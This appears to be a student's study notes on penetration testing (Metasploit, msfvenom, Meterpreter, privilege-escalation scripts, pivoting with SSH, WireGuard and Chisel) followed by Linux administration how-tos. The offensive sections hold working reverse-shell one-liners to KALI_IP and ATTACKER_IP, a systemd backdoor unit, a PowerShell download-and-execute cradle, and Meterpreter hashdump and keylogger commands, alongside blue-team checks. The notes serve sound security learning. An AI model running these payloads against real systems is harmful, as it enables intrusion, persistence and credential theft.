nmap --script smb-enum-shares --script-args smbusername=admin,smbpassword=pass123 -p 445 TARGET\_IP





Nmap NSE Windows Enumeration Scripts



\# Enumerate DNS

nmap --script dns-brute TARGET\_IP



\# Enumerate SNMP (if port 161 is open — reveals tons of system info)

nmap -sU --script snmp-info -p 161 TARGET\_IP

nmap -sU --script snmp-brute -p 161 TARGET\_IP



\# Enumerate LDAP (Active Directory)

nmap --script ldap-search -p 389 TARGET\_IP



\# Enumerate MSRPC

nmap --script msrpc-enum -p 135 TARGET\_IP



\# Enumerate NetBIOS

nmap --script nbstat -p 137 -sU TARGET\_IP



\# Grab banners from all services

nmap -sV --script=banner -p 21,22,25,80,139,445,3389 TARGET\_IP





JAWS (Just Another Windows Enum Script)



Jaws is a powershell script run on a windows machine you've already compromised to find ways to escalate your privileges from a regular user to admin/SYSTEM. It's a post-exploitation tool - you use it after you've gotten initial access. 





How to use it

Get it onto the target



Method 1 — Download from your Kali attack machine:

Host it on Kali:



cd /path/to/jaws

python3 -m http.server 8080



Download it on the Windows target:



\# On Windows target (from cmd or PowerShell)

certutil -urlcache -f http://KALI\_IP:8080/jaws-enum.ps1 C:\\temp\\jaws-enum.ps1



Method 2 — Run it directly from Kali without saving to disk (stealthier):



powershell.exe -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://KALI\_IP:8080/jaws-enum.ps1'))"





What is Enumeration vs Exploitation vs Privilege Escalation?



Enumeration — Gathering information about the target (you just learned this with enum4linux, nmap, JAWS)

Exploitation — Using a vulnerability to get initial access (Metasploit, MSFVenom, ExploitDB)

Privilege Escalation — Going from low-privilege user to admin/root after you're already in (PEASS-ng, and Metasploit again)





ExploitDB



ExploitDB is a public database of known exploits and vulnerabilities maintained by Offsec.



When you run nmap with -sV and discover exact software versions, ExploitDB is where you can go next. It shows you how you can break in after finding what's running. 



Examples for how to use ExploitDB on Kali:



\# Search for exploits by software name

searchsploit apache 2.4



\# Search for a specific product and version

searchsploit openssh 7.2



\# Search for Windows privilege escalation exploits

searchsploit windows local privilege escalation



\# Search for SMB exploits

searchsploit smb



\# Search for a specific CVE

searchsploit CVE-2021-44228



Typical Workflow:

1. Nmap discovers vsftpd 2.3.4 on port 21
2. searchsploit vsftpd 2.3.4 -> finds known backdoor
3. searchsploit -m 17491 -> copies it to your working directory
4. read the code, understand what it does
5. Run it against the target





Metasploit Framework



Metasploit is the most widely used exploitation framework in the world. It's a massive collection of exploits, payloads, auxiliary tools, and post-exploitation modules all organized in one console. Instead of find individual exploit scripts and figuring out how to run them, Metasploit gives you a unified interface. Comes with Kali and launched with msfconsole. 



Basic Workflow:



\# Start Metasploit

msfconsole



\# Search for an exploit

msf> search vsftpd

msf> search type:exploit platform:windows smb

msf> search cve:2017-0144



\# Select an exploit

msf> use exploit/unix/ftp/vsftpd\_234\_backdoor



\# See what options need to be set

msf> show options



\# Set the target

msf> set RHOSTS 192.168.170.131



\# See available payloads for this exploit

msf> show payloads



\# Set a payload

msf> set PAYLOAD cmd/unix/interact



\# Set your listener IP (your Kali IP)

msf> set LHOST 192.168.170.130



\# Run it

msf> exploit

\# or

msf> run



Meterpreter: advanced Metasploit tool with feature rich shell for exploitation once payload lands. 



\# System info

meterpreter> sysinfo

meterpreter> getuid



\# File system

meterpreter> pwd

meterpreter> ls

meterpreter> cd C:\\\\Users

meterpreter> download secret.txt

meterpreter> upload linpeas.sh /tmp/



\# Privilege escalation

meterpreter> getsystem          # attempts multiple priv-esc techniques

meterpreter> getprivs           # show current privileges



\# Network

meterpreter> ipconfig

meterpreter> arp

meterpreter> route



\# Credential harvesting

meterpreter> hashdump           # dump password hashes (needs SYSTEM)

meterpreter> load kiwi          # load Mimikatz-like module

meterpreter> creds\_all          # dump all credentials



\# Persistence and pivoting

meterpreter> run persistence    # set up auto-reconnect backdoor

meterpreter> portfwd add -l 3389 -p 3389 -r TARGET\_IP  # port forward



\# Useful

meterpreter> screenshot         # take screenshot of target desktop

meterpreter> keyscan\_start      # start keylogger

meterpreter> keyscan\_dump       # read captured keystrokes

meterpreter> shell              # drop to a raw OS shell



MSFVenom (Payload Generator)



MSFVenom is Metasploit's standalone payload generator. It creates the malicious files/code you deliver to a target. 



The basic formula:

msfvenom -p <payload> LHOST=<your\_ip> LPORT=<your\_port> -f <format> -o <output\_file>



Most common payloads: (target connects back to you)



Windows Reverse shell

\# Meterpreter (full-featured shell)

msfvenom -p windows/x64/meterpreter/reverse\_tcp LHOST=192.168.170.130 LPORT=4444 -f exe -o shell.exe



\# Basic cmd shell (simpler, less features)

msfvenom -p windows/x64/shell\_reverse\_tcp LHOST=192.168.170.130 LPORT=4444 -f exe -o shell.exe



Linux Reverse shell

\# Meterpreter

msfvenom -p linux/x64/meterpreter/reverse\_tcp LHOST=192.168.170.130 LPORT=4444 -f elf -o shell.elf



\# Basic bash shell

msfvenom -p linux/x64/shell\_reverse\_tcp LHOST=192.168.170.130 LPORT=4444 -f elf -o shell.elf



Web payloads (for web app exploitation)

\# PHP

msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.170.130 LPORT=4444 -f raw -o shell.php



\# ASP (Windows IIS servers)

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.170.130 LPORT=4444 -f asp -o shell.asp



\# JSP (Java servers)

msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=192.168.170.130 LPORT=4444 -f raw -o shell.jsp



\# WAR (Tomcat)

msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=192.168.170.130 LPORT=4444 -f war -o shell.war





PEASS-ng



Peass-ng (Privilege Escalation Awesome Scripts Suite - New Generation) is a collection of scripts that automate privilege escalation enumeration on machines you've already compromised. It has two main components:

* LinPEAS - Bash script for Linux/macos
* WinPEAS - Powershell script / C# executables for windows



PEASS-ng is like an upgrade to JAWS



PEASS-ng highlights the likelihood of being able to exploit it's findings in colors. Red colors like red and orange mean more likely while colors like blue mean unlikely. 



How to run LinPEASS on Kali (stealthy)

* curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
* Save output to a file: ./linpeas.sh | tee linpeas\_output.txt



How to run WinPEASS on Kali

* certutil -urlcache -f http://KALI\_IP:8080/winPEASx64.exe winpeas.exe
* Save output: .\\winpeas.exe > winpeas\_output.txt





Zero-day Exploit

ehavior. 

A zero-day exploit is an attack that targets a vulnerability the software vendor doesn't know exists yet. The name comes from the fact that developers have had zero days to fix it.



A zero day can be discovered with:

* fuzzing which is the process of bombarding software with random, malformed, or unexpected input to trigger crashes or unexpected. 
* reverse engineering software
* code auditing open-source software for mistakes like integer overflows etc.
* buying zero day exploits on black markets





Systemd



Systemd is the first process that runs when a Linux machine boots up and it manages everything else that starts after it. When your Linux machine boots, the kernel loads then immediately hands control to system (PID 1). Systemd then reads it's config and starts everything else: networking, ssh, logging, firewall, etc. 



Systemctl is how you talk to system. Every service management task goes through it. 



Persistent backdoor unit in system:



\# Attacker creates /etc/systemd/system/backdoor.service

\[Unit]

Description=System Health Monitor



\[Service]

ExecStart=/bin/bash -c 'bash -i >\& /dev/tcp/ATTACKER\_IP/4444 0>\&1'

Restart=always

RestartSec=60



\[Install]

WantedBy=multi-user.target





How to check system as blue team:



\# Look for suspicious services

systemctl list-units --type=service --all | grep -v "loaded active"



\# Check what's enabled to start on boot (look for anything unfamiliar)

systemctl list-unit-files --type=service --state=enabled



\# Check for failed services (might indicate a crashed exploit or malware)

systemctl --failed



\# Look for recently created/modified unit files

find /etc/systemd/system/ -type f -newermt "7 days ago"

find /lib/systemd/system/ -type f -newermt "7 days ago"



\# Check user-level services (attackers can create per-user services too)

find /home -path "\*/.config/systemd/user/\*.service" 2>/dev/null



\# Review logs for suspicious service activity

journalctl --since "24 hours ago" -p warning



\# Check a specific suspicious service's full log

journalctl -u suspicious-service -n 100 --no-pager





Memory Corruption Vulnerabilities



These are flaws in how programs manage memory. They primarily affect code written in C and C++, which don't have built-in protections against accessing or overwriting memory they shouldn't. 



Buffer Overflow



A program writes more data into a memory buffer than it was designed to hold. The excess data spills into adjacent memory, overwriting whatever was stored there.



Analogy: You have an 8-ounce glass and pour 12 ounces of water into it. The overflow spills onto whatever is next to the glass. 

* If an attacker carefully controls what overflows and where it lands, they can overwrite critical data - like the return address on the stack (which tells the program where to jump next). Replace that address with a pointer to your shellcode, and the program executes your code instead of its own. 





Use-After-Free (UAF)



A program frees (deallocates) a chunk of memory, but keeps a pointer to it and continues using that pointer. The memory gets reallocated for something else, but the old pointer, it's accessing memory that now belongs to something else entirely. 



analogy: You check out of a hotel room, but keep  the key. The room gets assigned to a new guest. You walk in and rearrange their stuff - or worse, they left their laptop open and you access it. 

* An attacker can manipulate what gets allocated into the freed memory space. If they can place their own data there (like a fake object with a function pointer), and the program later calls a function through the stale pointer, it executes the attacker's code. 



Heap Overflow



Same concept as a stack buffer overflow, but targeting the heap. When a program allocates memory on the heap and writes past the boundary, it corrupts adjacent heap structures. 



Why it's different from stack overflow: The heap doesn't have a convenient return address sitting right next to your buffer like the stack does. Instead, attackers corrupt heap metadata (the bookkeeping data that the memory allocator uses to track chunks) or overwrite adjacent objects. This can lead to arbitrary write primitives, where the attacker can write any value to any memory address — which is essentially game over.



Iptables (for pivoting as a router)



For pivoting, iptables turns the compromised machine into a router that forwards traffic between network segments. Instead of tunneling through SSH, you configure the compromised host to literally route packets from one interface to another. 



1. Enable IP forwarding 
* By default, Linux drops packets not destined for itself. To make it forward packets between networks:



\# Enable immediately (doesn't persist after reboot)

echo 1 > /proc/sys/net/ipv4/ip\_forward

* or with sysctl: sysctl -w net.ipv4.ip\_forward=1



\# Make it permanent

echo "net.ipv4.ip\_forward = 1" >> /etc/sysctl.conf

sysctl -p 



2\. Port forwarding with iptables

* Redirect traffic arriving on one port to a different host and port on the internal network:



\# Forward anything hitting port 8080 on the pivot to the internal web server

iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 10.0.0.20:80



\# Masquerade the source so return traffic comes back through the pivot

iptables -t nat -A POSTROUTING



3\. Now from Kali: curl http://pivot\_ip:8080 hits the internal web server on port 80



SSH Tunneling (for pivoting)



Scenario

\[Your Kali] → can reach → \[Compromised Web Server] → can reach → \[Internal Database Server]

192.168.1.50              10.0.0.5                                 10.0.0.20:3306



Your Kali CANNOT reach 10.0.0.20 directly.

You've compromised the web server and have SSH credentials. Now you need to reach the internal database. 



Local port forwarding (reach one specific service)

* ssh -L 3306:10.0.0.20:3306 user@10.0.0.5

This says: "Listen on port 3306 on my Kali machine. Anything that hits it, send it through the SSH tunnel to the web server (10.0.0.5), and from there forward it to the database server (10.0.0.20) on port 3306."

Now on Kali: mysql -h 127.0.0.1 -P 3306 -u dbadmin -p



WireGuard for Pivoting



WireGuard runs in the kernel, not in userspace like OpenVPN. This makes it significantly faster, with less overhead. It's also much simpler — configuration is minimal, the codebase is tiny (\~4,000 lines vs OpenVPN's \~100,000), and the cryptography is modern and non-negotiable (no choosing weak ciphers).

WireGuard for pivoting

Scenario: Pivot through your Ubuntu VM to reach an isolated network

On Ubuntu (pivot) — the config you already have, extended with routing:

ini\[Interface]

PrivateKey = UBUNTU\_PRIVATE\_KEY

Address = 10.0.0.2/24

ListenPort = 51820



\# Enable IP forwarding when the tunnel comes up

PostUp = sysctl -w net.ipv4.ip\_forward=1; iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE

PostDown = iptables -t nat -D POSTROUTING -o ens33 -j MASQUERADE



\[Peer]

PublicKey = KALI\_PUBLIC\_KEY

AllowedIPs = 10.0.0.1/32

On Kali — route internal traffic through WireGuard:

ini\[Interface]

PrivateKey = KALI\_PRIVATE\_KEY

Address = 10.0.0.1/24



\[Peer]

PublicKey = UBUNTU\_PUBLIC\_KEY

AllowedIPs = 10.0.0.2/32, 172.16.0.0/24

Endpoint = UBUNTU\_IP:51820

The key addition: 172.16.0.0/24 in AllowedIPs. This tells WireGuard "route traffic for the 172.16.0.0/24 network through this tunnel too." Combined with the NAT masquerading on Ubuntu, your Kali can now reach any host on 172.16.0.0/24 through the WireGuard tunnel.



Chisel 



Chisel is a single-binary TCP/UDP tunnel tool written in Go. It creates tunnels over HTTP, which means it works through web proxies and firewalls that only allow port 80/443 traffic. Works in environments where SSH is blocked, OpenVPN is blocked, and Wireguard is blocked. Only good for post exploitation. 

Why Chisel exists

SSH tunneling requires SSH access. OpenVPN and WireGuard require installation. In many real-world scenarios, the compromised host has none of these — but it has outbound HTTP access (because the firewall allows web browsing). Chisel fills this gap.



If you can ping the host but can't access it you need to enumerate first:



\# What ports are open?

nmap -sV -sC -p- TARGET\_IP



\# What services are running?

nmap -A TARGET\_IP



\# Web server on port 80/443?

curl -v http://TARGET\_IP

nikto -h http://TARGET\_IP

dirb http://TARGET\_IP



\# SMB on 139/445?

enum4linux -a TARGET\_IP



\# FTP on 21? Check for anonymous login

ftp TARGET\_IP

\# username: anonymous, password: (blank)



\# Any known vulnerable service versions?

searchsploit <service\_name> <version>





Chisel reverse tunnel (more realistic in practice)

SSH reverse tunnels require the compromised host to have an SSH client and your credentials. In many real scenarios you only have basic command execution (a web shell, a reverse shell through netcat). Chisel handles this better.

On your Kali (server, waiting for the connection):

bashchisel server --reverse --port 8888

On the compromised host (client, connects outbound to you):

bashchisel client KALI\_IP:8888 R:socks

Same result — SOCKS proxy on Kali port 1080 with traffic exiting from the compromised host. But no SSH credentials needed, just the ability to execute a binary.

Netcat / reverse shell (the most basic version)

If you can't even upload chisel, a basic reverse shell is the most primitive form of this same concept:

On Kali (listener):

bashnc -lvnp 4444

On the compromised host (connects back to you):

bashbash -i >\& /dev/tcp/KALI\_IP/4444 0>\&1

This isn't a tunnel — it's just a shell. But it solves the fundamental problem (the target can't be reached, so it reaches out to you). Once you have this shell, you can upload chisel through it and set up a proper tunnel.



Sources for current and emerging technologies: Gartner (gartner.com), Forrester Research (forrester.com), DEF CON (defcon.org), Black Hat (blackhat.com), SANS Summits and Webcasts (sans.org/webcasts). 



Sources that discuss vulnerability research and novel attack vectors: Google project zero blog, Phrack magazine, PortSwigger Research Blog



Sources that list current security vulnerabilities: NIST (nvd.nist.gov), MITRE CVE Database (cve.mitre.org), MITRE ATT\&CK Framework (attack.mitre.org), CISA KEV (cisa.gov/known-exploited-vulnerabilities-catalog), ExploitDB





Cellular Technology 



Cellular technology works by dividing geographic areas into small zones called cells, each with its own low-power radio transmitter (a cell tower). Instead of one giant transmitter trying to cover an entire city, hundreds of small transmitters hand off your connection as you move between cells. 



GSM (Global System for Mobile Communications)



The dominant global standard, used in over 220 countries. Uses time division - multiple calls take tuns sharing the same radio frequency. Each call gets a tiny time slot, and they rotate so fast you never notice. 

* Uses SIM cards
* Weaker in rural areas compared to CDMA
* Better for international travel





CDMA (Code Division Multiple Access)



Primarily US technology used by Verizon and Sprint



Uses code division - multiple calls happen on the same frequency simultaneously, each encoded with a unique key. The receiver uses the matching key to decode only the intended call from the noise. 

* Authenticates the device itself rather than a sim card.
* Better rural coverage. 
* Couldn't do voice and data simultaneously.



Software-defined networking. 5G is the first all-software network. Previous generations used purpose-built hardware for routing and network management. 5G virtualizes these functions in software. This means the same types of software vulnerabilities I've been studying (buffer overflows, injection, misconfigurations) now apply directly to the cellular network infrastructure itself.



Network slicing. 5G can create virtual isolated network segments (slices) for different purposes — one slice for IoT devices, another for emergency services, another for consumer data. If the isolation between slices fails, an attacker who compromises one slice could reach another. This is conceptually similar to VLAN hopping or VM escape attacks.

Massive IoT expansion. 5G is designed to connect billions of devices — smart cities, autonomous vehicles, medical devices, industrial sensors. Every connected device is an attack surface. Many IoT devices have weak security, no update mechanisms, and default credentials — the problems you've already seen on a small scale now multiply to billions of endpoints.





Viewing journalctl errors:



See all errors and above

* sudo journalctl - p err

Errors on a specific service

* sudo journalctl -p err -u ssh
* sudo journalctl -p err -u networking

Follow errors in real time

* sudo journalctl -p err -f



\*\*\*Note every tmux command begins with ctrl+b then you let go and press the second key\*\*\*



TMUX Commands:



TMUX QUICK REFERENCE

====================



START / SESSION MANAGEMENT

\--------------------------

tmux                        Start new session

tmux new -s name            Start named session

tmux ls                     List sessions

tmux attach                 Reattach to last session

tmux attach -t name         Reattach to named session

tmux kill-session -t name   Kill a session



ALL COMMANDS BELOW START WITH: Ctrl+B (then let go, then press the next key)



PANES (SPLITTING)

\-----------------

Ctrl+B  "         Split horizontal (top/bottom)

Ctrl+B  %         Split vertical (side by side)

Ctrl+B  arrow     Move between panes

Ctrl+B  x         Kill current pane

Ctrl+B  z         Zoom pane full screen (again to unzoom)



WINDOWS (TABS)

\--------------

Ctrl+B  c         Create new window

Ctrl+B  n         Next window

Ctrl+B  p





Illustrate where to find logs on a Linux machine

&#x09;1. What is dmesg for?

&#x09;2. What is syslog for?

&#x09;3. What is wtmp?

&#x09;4. What is btmp?

&#x09;5. What is auth.log?



* Almost everything is in /var/log
* Dmsg the kernel's own message buffer. It records everything the kernel does - hardware detection, driver loading, device connections, disk errors, memory issues, network interface changes. Think memory issues, disk failures, usb plugged in, network interfaces going up or down. 
* \# View all kernel messages
* dmesg
* 
* \# View with human-readable timestamps
* dmesg -T
* 
* \# Only errors and above
* dmesg -l err
* 
* \# Follow in real time (like tail -f)
* dmesg -w
* 
* \# Filter for something specific
* dmesg | grep -i usb
* dmesg | grep -i error
* dmesg | grep -i eth
* Syslog is the catch-all log for system activity. Almost everything that isn't kernel-specific or authentication specific ends up here - services starting and stopping, cron jobs running, application messages, network events, etc. 
* wtmp is a binary file that records every successful login and logout. Also records system reboots and shutdowns. view with last command. 
* btmp is the opposite of wtmp. Also a binary file that records every failed login attempt. Wrong passwords, invalid usernames, failed SSH attempts. View with lastb command. 
* Auth.log records everything related to authentication and authorization - successful and failed SSH logins, sudo usage, password changes, user account modifications, etc.  



Demonstrate how to view ip addresses. And describe what the output means. What are two ways to show your available interfaces and their information?



* ip a or ipconfig if net-tools is installed. 
* scope host shows what this addresses is reachable by in ip a and host means only the host. 
* The loopback interface is how your machine communicates with itself. When you type localhost or 127.0.0.1 in a browser or connect to a local service, traffic goes through lo. 



Demonstrate how to test connectivity to a remote host. 1. ping 2. nmap a. Show that you can see what services are running on remote systems, and what ports are open. 3. traceroute 4. mtr 5.netcat

* If you ping a machine, 64 = Linux, 128 = windows, 255 = network device for TTL
* Traceroute tells you the network path to a target
* mtr is ping + traceroute combined in real time. Therefore it can show you patterns.



Demonstrate how to see active listening and established connection via netstat

* show listening ports (what services are waiting for connections)
* sudo netstat -tlnp
* show established connections (who's currently connected)
* sudo netstat -tnp
* show both listening and established
* sudo netstat -tanp




Demonstrate how to see currently logged in users and currently open files:

	1. Who

	2. Isof (list open files)

		a. How do you specify open files by user?

# Show ALL open files (massive output — thousands of lines)
sudo lsof

# Pipe to less so you can scroll through it
sudo lsof | less

# All files opened by a specific user
sudo lsof -u <username)

# Network connections by a specific user
sudo lsof -u <username> -i

# Files opened by root
sudo lsof -u root

# Files opened by www-data (web server user)
sudo lsof -u www-data

# Exclude a user (show everything EXCEPT root)
sudo lsof -u ^root

Demonstrate how to update packages on Ubuntu and CentOS using yum and apt. 
	1. How do you download, but not install a package? 
	2. What is dpkg and how do you use it? 
	3. How do you install an rpm? 
	4. How do you install a .deb file? 
	5. How do you install a pip package? 
	6. What is a .whl file? 
	7. Where are the files that yum and apt uses to find where to go to update packages?

- Download but not install package: sudo apt download <package> This is useful for transferring files to an air-gapped machine for offline installation. 
- dpkg is the low-level package tool that actually installs, removes, and manages .deb files on Debian/Ubuntu systems. You'd use this to install a .deb file that you downloaded manually. 

# Install a .deb file you already have
sudo dpkg -i package_name.deb

# Remove a package
sudo dpkg -r package_name

# Remove a package AND its config files (purge)
sudo dpkg -P package_name

# List ALL installed packages
dpkg -l

# Search installed packages for something specific
dpkg -l | grep nmap

# Check if a specific package is installed
dpkg -s nmap

# List all files that a package installed (where did it put things?)
dpkg -L nmap

# Find which package owns a specific file
dpkg -S /usr/bin/nmap

# Show contents of a .deb file without installing
dpkg -c package_name.deb

# Show info about a .deb file without installing
dpkg -I package_name.deb

- rpm is the Red Hat (CentOS, RHEL, Fedora) equivalent of dpkg. 
# Install an .rpm file directly
sudo rpm -ivh package_name.rpm
- How do you install a .deb file?
# Method 1: Use apt (handles dependencies automatically — best option)
sudo apt install ./package_name.deb

# Method 2: Use dpkg then fix dependencies
sudo dpkg -i package_name.deb
sudo apt install -f -y

- How do you install a pip package?

Pip is python's package manager. It installs python libraries and tools from PyPI (Python Package Index)
# Install pip if you don't have it
sudo apt install python3-pip -y          # Debian/Ubuntu
sudo dnf install python3-pip -y          # CentOS

# Install a package
pip3 install requests

- A .whl (wheel) file is a pre-built python package. It's the .deb/.rpm equivalent for python. A ready to install binary that doesn't need compiling. 
# Install a .whl file you downloaded
pip3 install package_name.whl --break-system-packages

# Download wheels for a package (for offline install later)
pip3 download requests

- Where apt and yum/dnf find their package sources
# Main sources file
cat /etc/apt/sources.list

A package is just a compressed file containing a program and instructions for where to put it. The program itself, config files the program needs, documentation, a list of other packages the program needs to work (dependencies), instructions telling the system where to put each file. On Debian/Ubuntu these files are .deb files. Packages live on servers on the internet called repositories (repos). A repository is just a website hosting thousands of .deb or .rpm files organized in a specific structure.

When you installed Debian, it was configured to know about Debian's official repositories. Those URLs are stored in the source files:
bash# Debian/Ubuntu — this file contains the repo URLs
cat /etc/apt/sources.list

- So if I had a repository I wanted my machine to pull from I would put the reachable URL in the /etc/apt/sources.list file?
- yes 

Grub

Grub (GRand Unified Bootloader) is the first thing that runs when your Linux machine starts, before the OS even loads. It presents a menu of operating systems and kernel versions to boot from, then loads whichever you pick. 

- To see what's in your boot menu:
# List all menu entries GRUB knows about
grep -E "^menuentry|^submenu" /boot/grub/grub.cfg

How to change the default boot entry
Never edit /boot/grub/grub.cfg directly — it gets overwritten every time you update GRUB. Instead, edit the config file that GRUB uses to generate it:

sudo nano /etc/default/grub

Step 1 — see what's available:
grep -E "menuentry|submenu" /boot/grub/grub.cfg
Step 2 — change the default:
sudo nano /etc/default/grub
Change:
GRUB_DEFAULT=0
To:
GRUB_DEFAULT="1>2"
That means: "go into submenu 1 (Advanced options), pick entry 2 (the older kernel)."
Step 3 — apply:
sudo update-grub
sudo reboot

Demonstrate how to mount a remote drive from a Windows machine to a Linux Machine

CIFS (Common Internet File System) is the Linux implementation of SMB. cifs-utils gives you the ability to mount Windows shares. 

Step 1: Create a shared folder on Windows 11
- Right click folder -> properties -> sharing tab -> share
- Add user you want to grant access 
- Set permissions to read/write -> click share
- Annotate the network path

Step 2: Make sure Windows allows SMB traffic
- Allow SMB in allow an app through firewall in Windows Defender
- Make sure file and printer sharing is checked for private networks

Step 3: Test Connectivity and Ensure cifs-utils is installed on Linux machine

Step 4: Create a mount point
- sudo mkdir /mnt/windows_drive

Step 5: Mount the Windows drive
- if folder: sudo mount -t cifs //192.168.170.135/SharedFolder /mnt/windows_share -o credentials=/root/.smb_credentials
- if whole drive: sudo mount -t cifs //192.168.170.135/C$ /mnt/windows_share -o username=your_windows_username,password=your_windows_password



Illustrate how to use chroot and describe when you should use it

Chroot stands for change root. It changes what a process thinks is the root directory (/) of the filesystem. When you chroot into a directory, that directory becomes / for everything running inside it. The process can't see or access anything outside of that directory - it's trapped in a fake root. 

Basic usage
sudo chroot /path/to/new/root
- now everything after that runs as if /path/to/new/ root IS /

When you'd actually use it
1. Fixing a broken system that won't boot
This is the #1 reason you'll use chroot. Your Debian VM won't boot — maybe you broke GRUB, messed up fstab, or a bad kernel update killed it. You can't fix it from inside because it won't start. So you boot from a live USB/ISO and chroot into the broken system to repair it from the outside.
- lsblk to see broken system
- mount it: sudo mount /dev/sda1 /mnt
- now /mnt contains the entire broken system's filesystem.
- Now mount the special filesystems chroot needs:
sudo mount --bind /dev /mnt/dev
sudo mount --bind /dev/pts /mnt/dev/pts
sudo mount --bind /proc /mnt/proc
sudo mount --bind /sys /mnt/sys
sudo mount --bind /run /mnt/run
- Now chroot in: sudo chroot /mnt
- / is now the broken system's root not the bootable ISO. 


2. Resetting a forgotten password
You forgot the root password on your Debian VM and can't log in. Boot from the install ISO, chroot in, and reset it:
sudo mount /dev/sda1 /mnt
sudo mount --bind /dev /mnt/dev
sudo mount --bind /proc /mnt/proc
sudo mount --bind /sys /mnt/sys
sudo chroot /mnt

# Now reset the password
passwd root
passwd <username>

exit
sudo umount -R /mnt
sudo reboot

3. Isolating a process (sandboxing)

You can run a program inside of chroot so it can only see a minimal filesystem. If the program is compromised, the attacked is trapped in the chroot and can't access the real system. 
- Creating a minimal chroot environment:
# Create the directory structure
sudo mkdir -p /opt/jail/{bin,lib,lib64}

# Copy bash into the jail
sudo cp /bin/bash /opt/jail/bin/

# Copy the libraries bash needs (find them with ldd)
ldd /bin/bash
# Copy each listed library into the jail's lib directories
sudo cp /lib/x86_64-linux-gnu/libtinfo.so.6 /opt/jail/lib/
sudo cp /lib/x86_64-linux-gnu/libc.so.6 /opt/jail/lib/
sudo cp /lib64/ld-linux-x86-64.so.2 /opt/jail/lib64/

# Enter the jail
sudo chroot /opt/jail /bin/bash

What if the broken filesystem is encrypted?

Step 1: Boot from whatever Linux ISO you have

Step 2: Find the encrypted Partition
- lsblk

Step 3: Confirm its LUKS encrypted
- sudo cryptsetup isLuks /dev/sda2 && echo "Yes, it's LUKS"

Step 4: Decrypt the partition
- sudo cryptsetup luksOpen /dev/sda2 decrypted 
- One unlocked the decrypted partition appears at: /dev/mapper/decrypted

** If the system uses LVM on top of LUKS (common) **
- scan for LVM volumes inside decrypted partition
- sudo vgchange -ay
- list volumes: sudo lvs

Step 5: Mount
- Without LVM: sudo mount /dev/mapper/decrypted /mnt
- With LVM: sudo mount /dev/<root vg name in seen in lvs command>/root /mnt

Step 6: Mount boot partition separately (because not encrypted)
- sudo mount /dev/sda1 /mnt/boot

Step 7: Mount special filesystems and chroot
- sudo mount --bind /dev /mnt/dev
- sudo mount --bind /dev/pts /mnt/dev/pts
- sudo mount --bind /proc /mnt/proc
- sudo mount --bind /sys /mnt/sys
- sudo mount --bind /run /mnt/run
- sudo chroot /mnt


Illustrate how to setup a python virtual environment, and describe when you should use it

A python virtual environment is an isolated copy of python with its own packages, completely separate from your system python. Think of it like chroot but for python. Packages installed inside the virtual environment don't affect your system. Use it when building projects or scripts that import third-party packages. 

Step 1: Install venv
- sudo apt install python3-venv -y
Step 2: Create the virtual environment
- navigate to your project directory
- mkdir ~/projects
- cd ~/projects
- python3 -m venv <virtual_env_name>
- source /path/to/venv/bin/activate


Demonstrate how to use parted and gparted. Describe when you would use these functions.

Both are tools for managing disk partitions, creating, resizing, deleting, and organizing the sections of a hard drive. A partition is a logically separate section of a disk. 

- parted = command-line version
- gparted = graphical (gui) version of parted

- Use them for setting up a new disk. A raw disk has no partitions, you need at least one before you can store files. 
- Dual booting: installing Linux alongside Windows requires separate partitions for each OS. 
- Forensics: examining disk images from compromised machines - understanding partition layouts. 

Basic parted usage:
# Open parted on the new disk
sudo parted /dev/sdb #now you're in parted interactive mode
- view current partition layout:
	- print
- Create a partition table
	- mklabel gpt
- Create a partition
	- mkpart primary ext4 0% 50%
- Create a second partition with the remaining space
	- mkpart primary ext4 50% 100%
- Delete a partition
	- rm 2 (number is the partition number)
- After creating partitions you need to exit parted (quit) to format them
# Format the first partition as ext4
sudo mkfs.ext4 /dev/sdb1

# Format the second partition as ext4
sudo mkfs.ext4 /dev/sdb2
# Create mount points
sudo mkdir /mnt/disk1
sudo mkdir /mnt/disk2

# Mount
sudo mount /dev/sdb1 /mnt/disk1
sudo mount /dev/sdb2 /mnt/disk2

# Verify
df -h | grep sdb
lsblk

# Use them
echo "test file" | sudo tee /mnt/disk1/test.txt
ls /mnt/disk1


Add a remotely mounted file to /etc/fstab, and describe what /etc/fstab is used for

Fstab stands for file system table. It's a plain text file that tells your Linux system what to mount and where to mount it every time it boots. Without fstab, you'd have to manually mount every disk, partition, and network share after every reboot. Every line in fstab is an instruction: "take this device/share, put it at this location, use this filesystem type, with these options."

Step 1: Make sure manual mounting works because a broken fstab can hang boot
- sudo apt install cifs-utils -y
- create a mount point: sudo mkdir -p /mnt/windows_share
- test manual mount of windows vm for example: sudo mount -t cifs //192.168.170.135/SharedFolder /mnt/windows_share -o username=your_windows_user,password=your_windows_pass
- # Verify it works
ls /mnt/windows_share
- # Unmount it
sudo umount /mnt/windows_share

Step 2: Create a credentials file (don't put passwords in fstab)
fstab is readable by all users on the system. Passwords don't belong there. 
- sudo vim /root/.smb_credentials
username=your_windows_username
password=your_windows_password
domain=WORKGROUP
- lock it down:
sudo chmod 600 /root/.smb_credentials

Step 3: Add an entry to fstab
- sudo vim /etc/fstab
- //192.168.170.135/SharedFolder /mnt/windows_share cifs credentials=/root/.smb_credentials,_netdev,nofail,uid=1000,gid=1000,file_mode=0664,dir_mode=0775 0 0
- the ip is the remote share (what to mount, /mnt/windows_share is where it appears on your Debian/Linux filesystem, cifs is the file system protocol, credentials=/root/.smb_credentials is the password file location, _netdev this is a network mount - says to wait for network to be up before mounting, nofail meains if the windows machine is off, don't hang the boot

Step 4: Test without rebooting
- sudo mount -a
- -a reads fstab and mounts everything that isn't already mounted. If this works without errors, it'll work on boot. 



Illustrate how to mount an ISO using a one-liner 'for loop' to find the ISO, then mount it

- Essentially the for loop will have to search your filesystem for the ISO then mount it
- for iso in $(find / -name "*.iso" -type f 2>/dev/null); do echo "Found: $iso"; sudo mkdir -p /mnt/iso; sudo mount -o loop "$iso" /mnt/iso && echo "Mounted $iso at /mnt/iso"; break; done
- Broken down:
for iso in $(find / -name "*.iso" -type f 2>/dev/null); do
#   │            │       │              │       │
#   │            │       │              │       └── suppress "permission denied" errors
#   │            │       │              └────────── only files, not directories
